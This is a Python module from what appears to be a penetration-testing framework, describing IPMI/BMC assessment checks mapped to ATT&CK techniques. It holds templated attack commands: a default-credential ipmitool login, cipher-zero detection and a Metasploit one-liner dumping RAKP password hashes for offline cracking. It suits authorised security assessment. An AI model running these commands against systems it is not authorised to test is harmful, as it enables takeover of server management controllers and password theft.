#!/usr/bin/env python3
"""modules.ipmi — IPMI/BMC assessment methodology (built-in fallback)."""
from __future__ import annotations

from .base import SpecModule


class IPMIModule(SpecModule):
    name = "ipmi"
    title = "IPMI / BMC"
    NAMES = ("ipmi", "asf-rmcp")
    UNAUTH = ("ipmi", "asf-rmcp")
    SUMMARY = "IPMI/BMC service ({prod})."
    KEYWORDS = ("ipmi", "bmc", "rakp", "cipher zero")
    EXTRA_TECH = ("T1552",)
    SURFACE = (
        ("always", "BMCs often ship with default creds and protocol flaws (cipher-zero, RAKP hash leak) granting full out-of-band control."),
        ("unauth", "IPMI 2.0 RAKP allows remote retrieval of password hashes for offline cracking."),
    )
    CHECKS = (
        ("Version", "T1592.002", "nmap -sU -p{port} --script ipmi-version {ip}", "Identify the IPMI version and supported cipher suites."),
        ("Cipher-zero", "T1190", "nmap -sU -p{port} --script ipmi-cipher-zero {ip}", "Detect the cipher-zero authentication bypass (CVE-2013-4660)."),
        ("User enumeration", "T1087", "ipmitool -I lanplus -H {ip} -U <user> -P <pass> user list", "Enumerate IPMI user accounts and channel privilege levels."),
        ("Default creds", "T1078.001", "ipmitool -I lanplus -H {ip} -U ADMIN -P ADMIN chassis status", "Test documented BMC default credentials."),
        ("RAKP hash dump", "T1110.002", "msfconsole -qx 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {ip}; run; exit'", "Retrieve IPMI 2.0 RAKP hashes for offline cracking (hashcat -m 7300); hydra has no IPMI module."),
    )
